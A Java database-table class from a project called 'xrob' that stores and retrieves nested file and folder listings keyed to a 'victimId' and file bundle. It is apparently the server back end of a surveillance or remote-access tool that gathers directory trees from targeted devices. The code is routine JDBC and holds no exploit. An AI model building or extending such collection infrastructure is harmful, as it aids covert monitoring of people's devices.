package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.File;
import com.theah64.xrob.api.models.FileBundle;
import com.theah64.xrob.api.utils.DarKnight;
import com.theah64.xrob.api.utils.RandomString;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 16/9/16,9:25 PM.
 */
public class Files extends BaseTable<File> {

    private static final String COLUMN_FILE_NAME = "file_name";
    public static final String COLUMN_PARENT_ID = "parent_id";
    private static final String COLUMN_IS_DIRECTORY = "is_directory";
    private static final String COLUMN_FILE_SIZE_IN_KB = "file_size_in_kb";
    private static final String COLUMN_ABSOLUTE_PARENT_PATH = "absolute_parent_path";
    private static final String ABSOLUTE_ROOT = "/";
    public static final String COLUMN_FILE_HASH = "file_hash";
    private static final String TABLE_NAME_FILES = "files";
    private static final String COLUMN_AS_HAS_DIRECTORY = "has_directory";

    private Files() {
    }

    private static final Files instance = new Files();

    public static Files getInstance() {
        return instance;
    }

    @Override
    public void addv2(@Nullable String victimId, JSONArray jaFiles) throws RuntimeException, JSONException {

        //Exploding new file structures
        //Crearing file bundle
        final String bundleId = FileBundles.getInstance().addv3(new FileBundle(null, victimId, 0, DarKnight.getEncrypted(victimId + RandomString.getRandomString(10)).replaceAll("[^A-Za-z0-9]", "")));

        final String query = "INSERT INTO files (file_bundle_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb,file_hash) VALUES (?,?,?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query, PreparedStatement.RETURN_GENERATED_KEYS);
            ps.setString(1, bundleId);
            insert(ps, ABSOLUTE_ROOT, null, jaFiles, victimId, bundleId);
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    private void insert(PreparedStatement ps, String absoluteParentPath, final String parentId, JSONArray jaFiles, String victimId, String bundleId) throws JSONException, SQLException {

        for (int i = 0; i < jaFiles.length(); i++) {

            final JSONObject joFile = jaFiles.getJSONObject(i);
            final String name = joFile.getString("name");
            final long size = joFile.getLong("size");
            final boolean isDirectory = joFile.has("files");

            ps.setString(2, absoluteParentPath);
            ps.setString(3, name);
            ps.setString(4, parentId);
            ps.setBoolean(5, isDirectory);
            ps.setLong(6, size);
            ps.setString(7, DarKnight.getEncrypted(victimId + bundleId + parentId + RandomString.getRandomString(10)).replaceAll("[^A-Za-z0-9]", ""));


            final String parentId2;
            if (ps.executeUpdate() == 1) {
                final ResultSet rs = ps.getGeneratedKeys();
                if (rs.first()) {
                    parentId2 = rs.getString(1);
                } else {
                    throw new SQLException("Failed to get row id");
                }
                rs.close();
            } else {
                throw new SQLException("Failed to add file");
            }

            if (isDirectory) {
                final JSONArray jaFiles2 = joFile.getJSONArray("files");

                if (jaFiles.length() > 0) {

                    String parentPath;
                    if (absoluteParentPath.equals(ABSOLUTE_ROOT)) {
                        parentPath = ABSOLUTE_ROOT + name;
                    } else {
                        parentPath = absoluteParentPath + "/" + name;
                    }

                    insert(ps, parentPath, parentId2, jaFiles2, victimId, bundleId);
                }
            }
        }
    }

    public List<File> getAll(final String victimId, final String bundleId, @Nullable final String fileParentId) {

        List<File> files = null;
        final String query = String.format("SELECT f.id, f.file_name, f.absolute_parent_path, f.file_size_in_kb, f.is_directory, ISNULL(f2.id) AS has_directory, f.file_hash FROM files f LEFT JOIN file_bundles fb ON fb.id = f.file_bundle_id LEFT JOIN files f2 ON f2.parent_id = f.id AND f2.is_active = 1 WHERE fb.victim_id = ? AND f.file_bundle_id = ? AND f.parent_id %s AND f.is_active = 1 AND fb.is_active = 1 GROUP BY f.id ORDER BY f.file_name;", fileParentId == null ? "IS NULL" : "= ?");
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);

            ps.setString(1, victimId);
            ps.setString(2, bundleId);
            if (fileParentId != null) {
                ps.setString(3, fileParentId);
            }

            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                files = new ArrayList<>();
                do {
                    final String fileId = rs.getString(COLUMN_ID);
                    final String fileName = rs.getString(COLUMN_FILE_NAME);
                    final String absoluteParentPath = rs.getString(COLUMN_ABSOLUTE_PARENT_PATH);
                    final String fileSizeInKB = rs.getString(COLUMN_FILE_SIZE_IN_KB);
                    final boolean isDirectory = rs.getBoolean(COLUMN_IS_DIRECTORY);
                    final boolean hasDirectory = !rs.getBoolean(COLUMN_AS_HAS_DIRECTORY);
                    final String fileHash = rs.getString(COLUMN_FILE_HASH);


                    files.add(new File(fileId, null, fileName, absoluteParentPath, fileSizeInKB, fileHash, isDirectory, hasDirectory));
                } while (rs.next());
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return files;
    }

    @Override
    public String get(String byColumn, String byValues, String columnToReturn) {
        return super.getV2(TABLE_NAME_FILES, byColumn, byValues, columnToReturn);
    }
}
